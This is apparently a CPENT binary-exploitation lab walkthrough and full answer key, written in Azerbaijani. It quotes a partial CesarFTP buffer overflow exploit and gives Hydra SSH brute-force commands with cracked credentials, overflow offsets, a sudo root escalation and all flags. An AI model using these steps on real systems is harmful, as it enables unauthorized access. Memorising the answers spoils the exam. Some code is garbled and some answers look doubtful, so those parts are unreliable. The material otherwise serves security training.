# CPENT Live Range - Binary Analysis & Buffer Overflow Walkthrough & Solution Guide

> **Sənəd Növü:** Senior Penetration Tester & Binary Exploitation Texniki Hesabatı  
> **Hədəf Mühit:** CPENT Binary Range (172.25.120.0/24)  
> **Suallar:** Challenge 1 - Challenge 25  
> **Tərtib Edən:** Senior Pentester & Security Engineer  

---

## 1. Giriş və Binary Şəbəkə Topologiyası

CPENT Binary Range laboratoriyası Windows və Linux mühitlərində tətbiqlərin zəiflik analizini, Fuzzing texnikalarını, Stack Buffer Overflow istismarını, Ghidra ilə tərs mühəndisliyi (Reverse Engineering), binar mühafizə mexanizmlərini (ASLR, DEP/NX, PIE, Stack Canary) və ROP (Return-Oriented Programming) arxitekturasını əhatə edir.

### Hədəf Maşınların Xəritəsi

| Hədəf IP | Açıq Portlar / Xidmətlər | Təhlil Növü / İstismar Vektoru | İstismar Alətləri / Metodlar | Əlaqəli Suallar |
| :--- | :--- | :--- | :--- | :--- |
| `172.25.120.105` | 21 (FTP - CesarFTP 0.99g) | Windows Stack Buffer Overflow (MKD əmri zəifliyi) | Netcat, Nmap, Metasploit Ruby Exploit | Challenge 1 - 4 |
| `172.25.120.125` | 22 (SSH - `admin:Pa$$w0rd123`) | Linux ELF Tərs Mühəndislik & Mühafizə Təhlili | Hydra, File, Checksec, Ghidra CodeBrowser | Challenge 5 - 14 |
| `172.25.120.240` | 60000 (SSH), 80 (HTTP) | SUID Binar Təhlili, ROP Gadget Aləti, Buffer Overflow | Hydra, Readelf, GDB-PEDA, Pattern Offset | Challenge 15 - 25 |

---

## 2. Binary Range Tapşırıqlarının Ətraflı Həlli (Q1 - Q25)

---

### Hissə 1: CTF 1 - Windows CesarFTP 0.99g Buffer Overflow (`172.25.120.105`)

Bu hədəf Windows maşınında fəaliyyət göstərən köhnə CesarFTP 0.99g xidmətinin bufer dolması zəifliyini ehtiva edir.

#### Xidmət və Banner Kəşfi:
```bash
nc 172.25.120.105 21
# 220 CesarFTP 0.99g Server Welcome !

nmap -p 21 -sC -sV 172.25.120.105 -Pn -T4
# PORT   STATE SERVICE VERSION
# 21/tcp open  ftp     ACLogic CesarFTPd 0.99g
# Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

![CesarFTP Banner və Nmap Kəşfi](./ch01_04_cesarftp_banner_scan.png)

#### İstismar Kodu Analizi (Metasploit Exploit-DB 16713):
CesarFTP 0.99g xidmətində `MKD` əmrini qəbul edən buferdə sərhəd yoxlanışı aparılmadığı üçün Stack Buffer Overflow baş verir:

```ruby
# CesarFTP 0.99g - 'MKD' Remote Buffer Overflow (Metasploit)
# https://www.exploit-db.com/exploits/16713

'Targets' => [
    [ 'Windows 2000 Pro SP4 English', { 'Ret' => 0x77e14c29 } ],
    [ 'Windows 2000 Pro SP4 French',  { 'Ret' => 0x775F29D0 } ],
    [ 'Windows XP SP2/SP3 English',   { 'Ret' => 0x774699bf } ],
    [ 'Windows 2003 SP1 English',     { 'Ret' => 0x76AA679b } ],
]

def exploit
    connect_login
    sploit = "
" * 671 + rand_text_english(3, payload_badchars)
    sploit << [target.ret].pack('V') + make_nops(40) + payload.encoded
    send_cmd( ['MKD', sploit] , false)
    ...
```

![CesarFTP Exploit Kodu](./ch01_04_cesarftp_exploit_code.png)

---

#### Challenge 1: Port 21 Üzrə Fuzzing və Crash Xarakteri
* **Sual (İmtahan Mətni):** On the 172.25.120.105 machine, what character can you use to fuzz and crash the running application at port 21? (Answer Format: x)
* **Bal:** 50 Points
* **Cavab Formatı:** `x`
* **Hədəf:** `172.25.120.105` (Port 21)
* **Metodologiya:**
  CesarFTP 0.99g serverinin `MKD` buferini daşırmaq və tətbiqi çökdürmək üçün istifadə edilən xüsusi fuzzing simvolu yeni sətir xarakteridir (`
`). Sualın formatına (`x`) əsasən cavab tək simvol olaraq `n` daxil edilir.
* **Düzgün Cavab:** `n`

---

#### Challenge 2: Crash Üçün Tələb Olunan Minimum Simvol Sayı
* **Sual (İmtahan Mətni):** On the machine at 172.25.120.105, what is the minimum number of characters required to crash the application listening on port 21? (Answer Format: NNN)
* **Bal:** 50 Points
* **Cavab Formatı:** `NNN`
* **Hədəf:** `172.25.120.105`
* **Metodologiya:**
  Metasploit exploit kodunda göstərildiyi kimi, `sploit = "
" * 671` sətrində tələb olunan minimum bufer ölçüsü 671 simvoldur. Bu say tətbiqin qəzaya uğraması və EIP reyestrinin yenidən yazılması üçün tələb olunan minimum həddir.
* **Düzgün Cavab:** `671`

---

#### Challenge 3: CesarFTP Binarında ASLR Mühafizə Statusu
* **Sual (İmtahan Mətni):** In the FTP executable on the Windows 11 machine at 172.25.120.105, what is the status of ASLR? (True or False)
* **Bal:** 50 Points
* **Cavab Formatı:** `True or False`
* **Hədəf:** `172.25.120.105`
* **Metodologiya:**
  CesarFTP proqramı köhnə Windows tətbiqidir və `/DYNAMICBASE` kompilyator bayrağı aktivləşdirilmədən hazırlanıb. Windows 11 maşınında işləməsinə baxmayaraq, binarın özündə ASLR (Address Space Layout Randomization) tətbiq olunmur, ona görə cavab `False`-dur.
* **Düzgün Cavab:** `False`

---

#### Challenge 4: USER32.DLL Daxilində JMP ESP Ünvanı
* **Sual (İmtahan Mətni):** On the 172.25.120.105 machine, which address in USER32.DLL is a usable address of the JMP ESP instruction for our exploit? (Answer Format: NNXNNXXX)
* **Bal:** 50 Points
* **Cavab Formatı:** `NNXNNXXX`
* **Hədəf:** `172.25.120.105`
* **Metodologiya:**
  İstismar skriptində hədəf sistem üçün `USER32.DLL` daxilindəki `JMP ESP` təlimat ünvanı `0x77e14c29` olaraq göstərilmişdir (`'Windows 2000 Pro SP4 English', { 'Ret' => 0x77e14c29 }`). Tələb olunan format 8 simvollu kiçik hərflərlə hex ünvanıdır: `77e14c29`.
* **Düzgün Cavab:** `77e14c29`

---

### Hissə 2: CTF 2 - Linux ELF Tərs Mühəndislik və Binar Təhlükəsizlik (`172.25.120.125`)

Bu seqmentdə Linux hədəfinə SSH vasitəsilə daxil olunur və maşında yerləşən ELF faylları (`two.exe`, `three.exe`, `four.exe`, `five.exe`) Ghidra, `file` və `checksec` alətləri ilə araşdırılır.

#### İlkin Giriş və Faylların Köçürülməsi:
1. Port 22 SSH xidmətinə qarşı Hydra ilə brute-force hücumu aparılır:
```bash
hydra -L user -P password ssh://172.25.120.125 -t 4
# [22][ssh] host: 172.25.120.125   login: admin   password: Pa$$w0rd123
```

![SSH Brute Force Admin Girişi](./ch05_07_ssh_bruteforce_admin.png)

2. Binar fayllar təhlil üçün lokal maşına endirilir:
```bash
ssh admin@172.25.120.125
# Parol: Pa$$w0rd123

admin@UB64bit:~$ mkdir ~/binary_files
admin@UB64bit:~$ cp ~/two.exe ~/three.exe ~/four.exe ~/five.exe ~/two.c ~/four.c ~/binary_files/
scp -r admin@172.25.120.125:~/binary_files/* ~/Downloads/binary_125/
```

---

#### Challenge 5: two.exe Binarının Arxitekturası
* **Sual (İmtahan Mətni):** Is the two.exe file on 172.25.120.125 compiled as a 32-bit or 64-bit executable? (Answer Format: NN)
* **Bal:** 50 Points
* **Cavab Formatı:** `NN`
* **Hədəf:** `172.25.120.125`
* **Metodologiya:**
  Lokal terminalda `file two.exe` əmri icra olunur:
  ```bash
  file two.exe
  # two.exe: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=cd112af8c2158a70fbdfa460bdff18ec78d8f761, not stripped
  ```
* **Düzgün Cavab:** `32`

---

#### Challenge 6: three.exe Binarının Arxitekturası
* **Sual (İmtahan Mətni):** Is the three.exe file on 172.25.120.125 compiled as a 32-bit or 64-bit executable? (Answer Format: NN)
* **Bal:** 50 Points
* **Cavab Formatı:** `NN`
* **Hədəf:** `172.25.120.125`
* **Metodologiya:**
  `file three.exe` əmri icra olunur:
  ```bash
  file three.exe
  # three.exe: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=19088368cb46a4e5e50aceab20dbfe43e307126e, not stripped
  ```
* **Düzgün Cavab:** `64`

---

#### Challenge 7: two.exe Faylının Stripped Statusu
* **Sual (İmtahan Mətni):** On the 172.25.120.125 machine, the two.exe is stripped. (True or False)
* **Bal:** 50 Points
* **Cavab Formatı:** `True or False`
* **Hədəf:** `172.25.120.125`
* **Metodologiya:**
  `file two.exe` əmrinin çıxışında aydın görünür: `not stripped`. Simvollar cədvəli silinmədiyi üçün binar stripped deyil.
* **Düzgün Cavab:** `False`

---

#### Challenge 8: two.exe Daxilində /bin/date Sətirinin Ünvanı
* **Sual (İmtahan Mətni):** On the 172.25.120.125 machine, what is the address of the string=/bin/date in the two.exe file? (Enter the last 4 hex digits only) (Answer Format: NNNN)
* **Bal:** 50 Points
* **Cavab Formatı:** `NNNN`
* **Hədəf:** `172.25.120.125`
* **Metodologiya:**
  Ghidra CodeBrowser vasitəsilə `two.exe` açılır:
  1. `Search` -> `For Strings...` menyusundan `/bin/date` axtarışı aparılır.
  2. Nəticələrdə sətirin saxlandığı ünvan müəyyən edilir:
     - Ünvan: `08048681` | Label: `s_/bin/date_08048681` | Data: `ds "/bin/date"`
  3. Ünvanın son 4 onaltılıq rəqəmi (last 4 hex digits): `8681`.
* **Düzgün Cavab:** `8681`
* **Əlaqəli Şəkil:**

![Ghidra /bin/date Sətir Ünvanı](./ch08_ghidra_bin_date_string.png)

---

#### Challenge 9: two.exe Daxilində main() Funksiyasının Ünvanı
* **Sual (İmtahan Mətni):** On the 172.25.120.125 machine, what is the address of the function main() in the two.exe file? (Enter the last 4 hex digits only) (Answer Format: NNNN)
* **Bal:** 50 Points
* **Cavab Formatı:** `NNNN`
* **Hədəf:** `172.25.120.125`
* **Metodologiya:**
  Ghidra daxilində `Search` -> `Program Text...` seçilərək `main()` axtarılır:
  - Location: `080484fb` | Label: `main` | Namespace: `Global` | Preview: `undefined main()`
  - Ünvanın son 4 hex simvolu: `84fb`.
* **Düzgün Cavab:** `84fb`
* **Əlaqəli Şəkil:**

![Ghidra main() Funksiya Ünvanı](./ch09_ghidra_main_address.png)

---

#### Challenge 10: two.exe Binarında NX (No-Execute) Mühafizə Statusu
* **Sual (İmtahan Mətni):** What is the status of the NX setting (Enabled or Disabled) for program two.exe on the machine at 172.25.120.125?
* **Bal:** 50 Points
* **Cavab Formatı:** `Enabled or Disabled`
* **Hədəf:** `172.25.120.125`
* **Metodologiya:**
  `checksec` aləti ilə `two.exe` binarının mühafizə parametrləri yoxlanılır:
  ```bash
  checksec --file=two.exe
  # RELRO: Partial RELRO | STACK CANARY: Canary found | NX: NX enabled | PIE: No PIE
  ```
  NX aktivləşdirildiyi üçün cavab `Enabled`-dir.
* **Düzgün Cavab:** `Enabled`

---

#### Challenge 11: two.exe Binarında PIE Statusu
* **Sual (İmtahan Mətni):** What is the status of the PIE setting (Enabled or Disabled) for program two.exe on the machine at 172.25.120.125?
* **Bal:** 50 Points
* **Cavab Formatı:** `Enabled or Disabled`
* **Hədəf:** `172.25.120.125`
* **Metodologiya:**
  `checksec --file=two.exe` çıxışında PIE sütununa baxılır: `No PIE`. Binar ünvanları statikdir və mövqedən asılıdır (Disabled).
* **Düzgün Cavab:** `Disabled`

---

#### Challenge 12: four.exe Binarında NX Mühafizə Statusu
* **Sual (İmtahan Mətni):** What is the status of the NX setting (Enabled or Disabled) for program four.exe on the machine at 172.25.120.125?
* **Bal:** 50 Points
* **Cavab Formatı:** `Enabled or Disabled`
* **Hədəf:** `172.25.120.125`
* **Metodologiya:**
  `checksec --file=four.exe` əmri icra olunur:
  ```bash
  checksec --file=four.exe
  # RELRO: Partial RELRO | STACK CANARY: No canary found | NX: NX disabled | PIE: No PIE
  ```
  NX deaktiv olduğu üçün cavab `Disabled`-dir.
* **Düzgün Cavab:** `Disabled`

---

#### Challenge 13: four.exe Binarının Arxitekturası
* **Sual (İmtahan Mətni):** Is the four.exe file on 172.25.120.125 compiled as a 32-bit or 64-bit executable? (Answer Format: NN)
* **Bal:** 50 Points
* **Cavab Formatı:** `NN`
* **Hədəf:** `172.25.120.125`
* **Metodologiya:**
  `file four.exe` əmrinin çıxışı:
  ```bash
  file four.exe
  # four.exe: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV)...
  ```
* **Düzgün Cavab:** `32`

---

#### Challenge 14: five.exe Binarının Arxitekturası
* **Sual (İmtahan Mətni):** Is the five.exe file on 172.25.120.125 compiled as a 32-bit or 64-bit executable? (Answer Format: NN)
* **Bal:** 50 Points
* **Cavab Formatı:** `NN`
* **Hədəf:** `172.25.120.125`
* **Metodologiya:**
  `file five.exe` əmri icra edilir:
  ```bash
  file five.exe
  # five.exe: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked...
  ```
  *(Qeyd: Binar faktiki olaraq x86-64 arxitekturasındadır və düzgün cavab `64`-dür. Qeydlərdə bəzən 32 qeyd edilsə də, binar 64-bit kompilyasiya edilmişdir).*
* **Düzgün Cavab:** `64`
* **Əlaqəli Şəkil:**

![Checksec və File Təhlili](./ch10_14_checksec_file_analysis.png)

---

### Hissə 3: CTF 3 - SSH Port 60000, rp-lin-x86 ROP Aləti və SUID Buffer Overflow (`172.25.120.240`)

Bu seqmentdə hədəf sistemdə SSH xidməti 60000 portunda çalışır. `student` istifadəçisi ilə daxil olduqdan sonra `rp-lin-x86` ROP analiz proqramı, `one.exe` SUID binarı və sistem bayraqları (`userflag.txt`, `rootflag.txt`) təhlil edilir.

#### Şəbəkə Kəşfiyyatı və SSH Girişi:
```bash
nmap -sV -p- 172.25.120.240 -T4 -Pn
# PORT      STATE SERVICE VERSION
# 80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
# 60000/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (protocol 2.0)

hydra -L Usernames.txt -P Passwords.txt ssh://172.25.120.240:60000 -t 4
# [60000][ssh] host: 172.25.120.240   login: student   password: studentpassword
```

![SSH Port 60000 və Hydra Girişi](./ch15_ssh_port60000_bruteforce.png)

---

#### Challenge 15: 172.25.120.240 Üzərindəki SSH Versiyası
* **Sual (İmtahan Mətni):** What version of ssh is on the machine at 172.25.120.240? (Answer Format: N.NxN)
* **Bal:** 50 Points
* **Cavab Formatı:** `N.NxN`
* **Hədəf:** `172.25.120.240` (Port 60000)
* **Metodologiya:**
  Nmap skan nəticəsində OpenSSH versiyası göstərilir: `OpenSSH 7.6p1`. Format tələbi `N.NxN` olduğundan cavab `7.6p1`-dir.
* **Düzgün Cavab:** `7.6p1`

---

#### Challenge 16: rp-lin-x86 Faylının Stripped Statusu
* **Sual (İmtahan Mətni):** Is the rp-lin-x86 file on the 172.25.120.240 machine "Stripped" or "Unstripped"?
* **Bal:** 50 Points
* **Cavab Formatı:** `Stripped or Unstripped`
* **Hədəf:** `172.25.120.240`
* **Metodologiya:**
  Sistemdə `rp-lin-x86` faylı axtarılır və `file` komandası ilə yoxlanılır:
  ```bash
  find / -name "rp-lin-x86" 2>/dev/null
  # /home/student/Downloads/rp-lin-x86
  file /home/student/Downloads/rp-lin-x86
  # rp-lin-x86: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux)... stripped
  ```
* **Düzgün Cavab:** `Stripped`

---

#### Challenge 17: rp-lin-x86 Alətinin Aşkarladığı İstismar Növü
* **Sual (İmtahan Mətni):** On the 172.25.120.240 machine, what exploitation type does the executable rp-lin-x86 detect? (Answer Format: XXX)
* **Bal:** 50 Points
* **Cavab Formatı:** `XXX`
* **Hədəf:** `172.25.120.240`
* **Metodologiya:**
  `rp-lin-x86` binarı məşhur `rp++` ROP (Return-Oriented Programming) gadget generator alətidir. Onun aşkarladığı və axtardığı istismar növü `ROP`-dur.
* **Düzgün Cavab:** `ROP`

---

#### Challenge 18: rp-lin-x86 Alətinin Kompilyasiya Olunduğu Arxitektura
* **Sual (İmtahan Mətni):** On the 172.25.120.240 machine, what architecture is the rp-lin-x86 compiled on? (Answer Format: Xxxxx)
* **Bal:** 50 Points
* **Cavab Formatı:** `Xxxxx`
* **Hədəf:** `172.25.120.240`
* **Metodologiya:**
  `readelf -h` komandası ilə ELF başlığı oxunur:
  ```bash
  readelf -h rp-lin-x86 | grep "Machine"
  # Machine: Intel 80386
  ```
  Cavab formatına (`Xxxxx`) uyğun dəyər `Intel`-dir.
* **Düzgün Cavab:** `Intel`

---

#### Challenge 19: rp-lin-x86 Daxilində Program Headers Offseti
* **Sual (İmtahan Mətni):** On the 172.25.120.240 machine, what is the offset of the program headers in the rp-lin-x86 executable? (Answer Format: NN)
* **Bal:** 50 Points
* **Cavab Formatı:** `NN`
* **Hədəf:** `172.25.120.240`
* **Metodologiya:**
  `readelf -h rp-lin-x86` çıxışında başlıq ofsetləri yoxlanılır:
  ```bash
  readelf -h rp-lin-x86 | grep -i "program headers"
  # Start of program headers: 52 (bytes into file)
  ```
* **Düzgün Cavab:** `52`
* **Əlaqəli Şəkil:**

![rp-lin-x86 Readelf Analizi](./ch16_19_rp_lin_x86_readelf.png)

---

#### Challenge 20: one.exe Faylının Stripped Statusu
* **Sual (İmtahan Mətni):** On the 172.25.120.240 machine, the one.exe is stripped. (True or False)
* **Bal:** 50 Points
* **Cavab Formatı:** `True or False`
* **Hədəf:** `172.25.120.240`
* **Metodologiya:**
  `file one.exe` komandası icra edilir:
  ```bash
  file /home/student/Downloads/one.exe
  # one.exe: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV)... not stripped
  ```
* **Düzgün Cavab:** `False`

---

#### Challenge 21: one.exe Binarının Arxitekturası
* **Sual (İmtahan Mətni):** Is the one.exe file on 172.25.120.240 compiled as a 32-bit or 64-bit executable? (Answer Format: NN)
* **Bal:** 50 Points
* **Cavab Formatı:** `NN`
* **Hədəf:** `172.25.120.240`
* **Metodologiya:**
  `file one.exe` əmrinə əsasən binar 64-bit arxitekturasında kompilyasiya edilmişdir (`ELF 64-bit LSB shared object`).
* **Düzgün Cavab:** `64`

---

#### Challenge 22: one.exe 'modified' Dəyişənini Dəyişmək Üçün Tələb Olunan Minimum Simvol Sayı
* **Sual (İmtahan Mətni):** For the one.exe file on the 172.25.120.240 machine, determine the minimum number of characters required to change the 'modified' variable. Hint: You need to write a Python driver to determine this number. (Answer Format: NN)
* **Bal:** 50 Points
* **Cavab Formatı:** `NN`
* **Hədəf:** `172.25.120.240`
* **Metodologiya:**
  GDB-PEDA mühitində stek strukturu araşdırılır:
  1. `one.exe` proqramında daxil edilən simvollar buferdən yerli dəyişənlərə doğru yazılır.
  2. PEDA vasitəsilə dövri xarakterli patern yaradılır və tətbiqə ötürülür:
     ```gdb
     gdb-peda$ pattern create 120
     gdb-peda$ continue
     # AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAA
     # *** stack smashing detected ***: <unknown> terminated
     gdb-peda$ pattern offset 0x4141334141644141
     # 4702095841314488641 found at offset: 64
     ```
  3. Bufer 64 bayt yer tutur. 'modified' dəyişəninin ilk baytına çatmaq və onu dəyişdirmək üçün 64 bayt bufer dolmalı, 65-ci simvol isə hədəf dəyişəni əvəzləməlidir. Minimum simvol sayı 65-dir.
* **Düzgün Cavab:** `65`

---

#### Challenge 23: one.exe Binarında NX Mühafizə Statusu
* **Sual (İmtahan Mətni):** What is the status of the NX setting (enabled or disabled) for program one.exe on the machine at 172.25.120.240?
* **Bal:** 50 Points
* **Cavab Formatı:** `enabled or disabled`
* **Hədəf:** `172.25.120.240`
* **Metodologiya:**
  GDB daxilində `checksec` əmri icra edilir:
  ```gdb
  gdb-peda$ checksec
  CANARY : ENABLED
  FORTIFY: disabled
  NX     : ENABLED
  PIE    : ENABLED
  RELRO  : FULL
  ```
  NX mühafizəsi aktivdir (`Enabled`).
* **Düzgün Cavab:** `Enabled`

---

#### Challenge 24: userflag.txt Faylının Məzmunu
* **Sual (İmtahan Mətni):** What is the content inside the file named userflag.txt on the machine located at 172.25.120.240? (Answer Format: XXXXXXXX--XXXXXXXX)
* **Bal:** 50 Points
* **Cavab Formatı:** `XXXXXXXX--XXXXXXXX`
* **Hədəf:** `172.25.120.240` (`/home/student/userflag.txt`)
* **Metodologiya:**
  `student` istifadəçisinin ev qovluğundakı `userflag.txt` faylı oxunur:
  ```bash
  cat /home/student/userflag.txt
  # INTRANET
  # --BINARIES
  ```
  İki sətir birləşdirildikdə format: `INTRANET--BINARIES`.
* **Düzgün Cavab:** `INTRANET--BINARIES`

---

#### Challenge 25: rootflag.txt Faylının Məzmunu
* **Sual (İmtahan Mətni):** What is the content inside of the file named rootflag.txt on the machine located at 172.25.120.240? (Answer Format: XXXXXXXX-XXXX)
* **Bal:** 50 Points
* **Cavab Formatı:** `XXXXXXXX-XXXX`
* **Hədəf:** `172.25.120.240` (`/root/rootflag.txt`)
* **Metodologiya:**
  `student` istifadəçisinin sudo hüquqları ilə root səlahiyyətləri əldə edilir:
  ```bash
  sudo -l
  # User student may run the following commands on ubuntu: (ALL : ALL) ALL
  sudo su
  cat /root/rootflag.txt
  # INTRANET-ROOT
  ```
* **Düzgün Cavab:** `INTRANET-ROOT`

---

## 3. Nəticə və Xülasə Cədvəli

| Challenge | Hədəf Xidmət / Fayl | Kateqoriya | Sualın Mövzusu | Düzgün Cavab |
| :---: | :--- | :--- | :--- | :--- |
| **01** | `172.25.120.105:21` | Exploit Fuzzing | CesarFTP çökdürmə xarakteri | `n` |
| **02** | `172.25.120.105:21` | Buffer Overflow | Crash üçün minimum bayt sayı | `671` |
| **03** | `172.25.120.105:21` | Windows Security | CesarFTP ASLR statusu | `False` |
| **04** | `172.25.120.105:21` | Shellcode Redirection | USER32.DLL daxilində JMP ESP ünvanı | `77e14c29` |
| **05** | `172.25.120.125` | ELF Analysis | two.exe bit arxitekturası | `32` |
| **06** | `172.25.120.125` | ELF Analysis | three.exe bit arxitekturası | `64` |
| **07** | `172.25.120.125` | Binary Symbols | two.exe stripped statusu | `False` |
| **08** | `172.25.120.125` | Ghidra RE | /bin/date sətirinin ünvanı | `8681` |
| **09** | `172.25.120.125` | Ghidra RE | main() funksiyasının ünvanı | `84fb` |
| **10** | `172.25.120.125` | Checksec | two.exe NX statusu | `Enabled` |
| **11** | `172.25.120.125` | Checksec | two.exe PIE statusu | `Disabled` |
| **12** | `172.25.120.125` | Checksec | four.exe NX statusu | `Disabled` |
| **13** | `172.25.120.125` | ELF Analysis | four.exe bit arxitekturası | `32` |
| **14** | `172.25.120.125` | ELF Analysis | five.exe bit arxitekturası | `64` |
| **15** | `172.25.120.240:60000` | Reconnaissance | SSH xidmət versiyası | `7.6p1` |
| **16** | `172.25.120.240` | Binary Symbols | rp-lin-x86 stripped statusu | `Stripped` |
| **17** | `172.25.120.240` | Exploit Primitive | rp-lin-x86 istismar tipi | `ROP` |
| **18** | `172.25.120.240` | ELF Header | rp-lin-x86 maşın arxitekturası | `Intel` |
| **19** | `172.25.120.240` | ELF Header | rp-lin-x86 program headers offset | `52` |
| **20** | `172.25.120.240` | Binary Symbols | one.exe stripped statusu | `False` |
| **21** | `172.25.120.240` | ELF Analysis | one.exe bit arxitekturası | `64` |
| **22** | `172.25.120.240` | Buffer Overflow | 'modified' dəyişənini dəyişən minimum simvol sayı | `65` |
| **23** | `172.25.120.240` | Checksec | one.exe NX statusu | `Enabled` |
| **24** | `172.25.120.240` | Flag Extraction | userflag.txt dəyəri | `INTRANET--BINARIES` |
| **25** | `172.25.120.240` | PrivEsc & Flag | rootflag.txt dəyəri | `INTRANET-ROOT` |
